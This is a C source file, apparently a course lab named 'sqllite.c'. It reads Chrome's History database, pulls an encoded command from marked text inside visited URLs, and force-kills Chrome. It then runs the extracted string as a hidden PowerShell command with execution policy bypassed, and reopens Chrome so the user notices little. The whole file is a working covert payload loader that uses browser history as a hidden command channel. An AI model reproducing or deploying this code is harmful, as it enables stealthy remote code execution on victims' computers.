//
//  sqllite.c
//  CS150-Lab
//
//  Created by Tarek Abdelmotaleb on 11/17/19.
//  Copyright © 2019 Tarek Abdelmotaleb. All rights reserved.
//

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "sqlite3.h"

typedef int (*sqlite3_callback)(
    void*,
    int,
    char**,
    char**
);

static char *shell;
static char *shell2;


static int callback(void *data, int argc, char **argv, char **azColName){
    int i;


    char *pattern1 = "my";
    char * pattern2 = "<PATTERN1>";
    char * start, *end;
    char * pattern3 = "<PATTERN2>";
    //fprintf(stderr, "%s: ", (const char*)data);
    for(i = 0; i< argc; i++){
        if (argv[i] != NULL) {
            if (start = strstr(argv[i], pattern1)){
                start += strlen(pattern1);
                if (end = strstr(argv[i], pattern2)){
                    shell = (char*)malloc(end-start +1);
                    memcpy(shell, start, end - start);
                    shell[end-start] = '\0';
                     //printf("-----> %lu\n", strlen(shell));
                }
                else if (end = strstr(argv[i], pattern3)){
                    shell2 = (char*)malloc(end-start +1);
                    memcpy(shell2, start, end-start);
                    shell2[end-start]='\0';
                }
            }
        }
    }


    return 0;


}
int main()
{
    sqlite3 *db;
	char killme[200];
	char openChr[100];
    char *zErrMsg = 0;
    int rc;
    char *sql;
	char fullshell[7000];
    const char* data = "Callback function called";
	char* home = getenv("HOMEPATH");
	char* path = "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History";
	
	size_t len = strlen(home) + strlen(path) + 1;
	char* fullpath = malloc(len);
	
	strcpy(fullpath, home);
	strcat(fullpath, path);

    rc = sqlite3_open_v2(fullpath, &db, SQLITE_OPEN_READONLY, NULL);

   // if (rc) {
   //     fprintf(stderr, "Can't open databse %s\n", sqlite3_errmsg(db));
   //     return(0);

    //} else {
    //    fprintf(stderr, "Opened database successfully\n");

    //}


    sql = "select * from urls";
	//sprintf(killme, "taskkill /IM chrome.exe >nul 2>&1");
	sprintf(killme, "taskkill /F /IM chrome.exe");
	system(killme);
    rc = sqlite3_exec(db, sql, callback, (void*)data, &zErrMsg);

    if (rc != SQLITE_OK) {
        fprintf(stderr, "SQL error: %s\n", zErrMsg);
        sqlite3_free(zErrMsg);
    } //else {
     //   fprintf(stdout, "Operation done successfully\n");
    //}
    if (shell2 && shell){
		
        strcat(fullshell, shell);
		strcat(fullshell, shell2);
        
       char command[7000];
        sprintf(command, "powershell.exe -W Hidden -nop -ep bypass -NoExit -E %s", fullshell);
		
        system(command);
		//sprintf(openChr, "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --restore-last-session");
		sprintf(openChr, "start-process -FilePath \"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" -ArgumentList --restore-last-session");
		system(openChr);
        //FILE *cmd=popen(command, "r");
        //char result[24]={0x0};
        //while (fgets(result, sizeof(result), cmd) !=NULL){
          //  printf("%s\n", result);
        //}
		
        //pclose(cmd);

    }
    else {
        sqlite3_close(db);

    }
    free(shell);
	free(fullpath);

   // if (shell){
     //   printf("++++++ Part1 : %s\n", shell);

    //}

    return 0;
}
